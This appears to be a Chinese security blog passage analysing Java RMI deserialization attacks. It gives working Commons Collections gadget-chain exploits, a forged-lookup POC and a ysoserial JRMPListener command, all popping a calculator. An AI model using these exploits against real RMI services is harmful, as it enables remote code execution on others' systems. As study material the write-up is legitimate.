<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>关于绑定的地址很多地方会rmi:&#x2F;&#x2F;ip:port&#x2F;Objectname的形式，实际上看rebind源码就知道RMI:写不写都行，port如果默认是1099，不写会自动补上，其他端口必须写</p>
<h4 id="客户端代码"><a href="#客户端代码" class="headerlink" title="客户端代码"></a>客户端代码</h4><p>创建接口类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloInterface</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>连接注册服务 查找hello对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">HelloInterface</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloInterface) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            System.out.println(hello.sayHello(<span class="string">&quot;flag&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动服务端之后,在启动客户端看下.</p>
<p>服务端输出了</p>
<p><img src="https://baicany.github.io/images/image-20230727203708741.png" alt="image-20230727203708741"></p>
<p>客户端输出了hello</p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><p>从第一张图可以看到服务端也是向注册中心序列化传输远程对象,那么直接把远程对象改成反序列化Gadget看下</p>
<p>我们与注册中心进行交互可以使用如下几种方式</p>
<ul>
<li>list</li>
<li>bind</li>
<li>rebind</li>
<li>unbind</li>
<li>lookup</li>
</ul>
<p>当调用bind时，会用readObject读出参数名以及远程对象，此时则可以利用</p>
<p>修改服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">ouputMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(ouputMap, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">            <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            tmpMap.put(<span class="string">&quot;pwn&quot;</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello1&quot;</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;s</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Remote.class.cast这里实际上是将一个代理对象转换为了Remote对象</p>
<p>在服务端执行这段代码 注册中心计算器会弹出,这段代码就是ysoserial工具的RMIRegistryExploit代码,debug看下注册中心执行过程</p>
<p>触发反序列化操作位置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.rmi.registry.RegistryImpl_Skel#dispatch</span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/image-20230727205631861.png" alt="image-20230727205631861"></p>
<p>调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dispatch:-<span class="number">1</span>, RegistryImpl_Skel (sun.rmi.registry)</span><br><span class="line">oldDispatch:<span class="number">411</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:<span class="number">272</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">568</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">826</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">0</span>:<span class="number">683</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">736237439</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">1</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">682</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>dispatch里面对应关系如下</p>
<ul>
<li>0-&gt;bind</li>
<li>1-&gt;list</li>
<li>2-&gt;lookup</li>
<li>3-&gt;rebind</li>
<li>4-&gt;unbind</li>
</ul>
<p><strong>unbind&amp;lookup</strong></p>
<p><strong>unbind&amp;lookup</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br></pre></td></tr></table></figure>

<p>这里也有readObject，但是和bind以及rebind不一样的是只能传入String类型，这里我们可以通过伪造连接请求进行利用，修改lookup方法代码使其可以传入对象，原先的lookup方法</p>
<p>Registry_Stub#lookup</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var23;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                var23 = (Remote)var6.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var23;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var19;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var20;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var21;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(r);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p>此方法可以攻击客户端和服务端</p>
<p>对于注册中心来说，我们还是从这几个方法触发：</p>
<ul>
<li>bind</li>
<li>unbind</li>
<li>rebind</li>
<li>list</li>
<li>lookup</li>
</ul>
<p>除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-<span class="number">1.</span>jar ysoserial.exploit.JRMPListener <span class="number">12345</span>  CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后使用上面客户端的代码去访问</p>
<p>就成功实现客户端的RCE</p>
<p>debug看下客户端代码代码位置<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code></p>
<p>90行调用newCall方法创建socket连接,94行序列化lookup参数,104行反序列化返回值,而此时Registry的返回值是CommonsCollections5的调用链,所以这里直接反序列化就会触发.</p>
<h4 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h4><p>1.直接启动上面的注册中心代码</p>
<p>2.借助ysoserial项目JRMPClient攻击注册中心命令</p>
<p>执行完命令后计算器直接弹出来了,原因是RMI框架采用DGC(Distributed Garbage Collection)分布式垃圾收集机制来管理远程对象的生命周期,可以通过与DGC通信的方式发送恶意payload让注册中心反序列化。</p>
<p>debug注册中心代码看下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.rmi.transport.DGCImpl_Skel#dispatch</span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/image-20230727215456958.png" alt="image-20230727215456958">可以看到这里进行了反序列化操作。</p>
<p>列下调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dispatch:-<span class="number">1</span>, DGCImpl_Skel (sun.rmi.transport)</span><br><span class="line">oldDispatch:<span class="number">411</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:<span class="number">272</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:<span class="number">200</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">run:<span class="number">197</span>, Transport$<span class="number">1</span> (sun.rmi.transport)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">serviceCall:<span class="number">196</span>, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:<span class="number">568</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:<span class="number">790</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$<span class="number">0</span>:<span class="number">683</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-<span class="number">1</span>, <span class="number">286880721</span> (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$<span class="number">1</span>)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">run:<span class="number">682</span>, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p>服务端攻击客户端，大抵可以分为以下两种情景。</p>
<p>1.服务端返回参数为Object对象<br>2.远程加载对象</p>
<p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以cc1为例</p>
<p>恶意类LocalUser</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LocalUser</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LocalUser</span><span class="params">(String name, <span class="type">int</span> age)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                            String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title 